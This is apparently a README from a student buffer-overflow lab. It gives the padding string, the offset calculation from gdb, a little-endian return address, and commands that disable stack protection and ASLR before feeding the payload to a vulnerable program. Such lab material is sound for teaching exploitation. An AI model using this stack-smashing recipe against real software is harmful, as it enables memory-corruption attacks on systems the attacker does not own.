# Buffer-Overflow-

Features:

1. Attack string chosen in my program (attack-string.c) is
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"

2. Length of this string is 112.

3. If we use gdb and observe the actions in prompt() function, we can say that lea (Load effective
address) uses ox6c. In decimal it is 108. Size of base frame pointer is 32bit (or 4 bytes). Hence, we
enter 108+4=112 characters for buffer overflow(Since 1 character is of 1 byte we add 4 characters).

4. Target address in my machine is 0x08048ee0. So, I used this address in little endian form, that is,
\xe0\x8e\x04\x08

Steps executed:

1. gcc vuln_program.c -fno-stack-protector -z execstack -static -o vuln_program

2. sudo sysctl -w kernel.randomize_va_space=0

3. gcc attack-string.c -o attack-string

4. ./attack-string $'\xe0\x8e\x04\x08' > ./attack.input

5. ./vuln_program<./attack.input
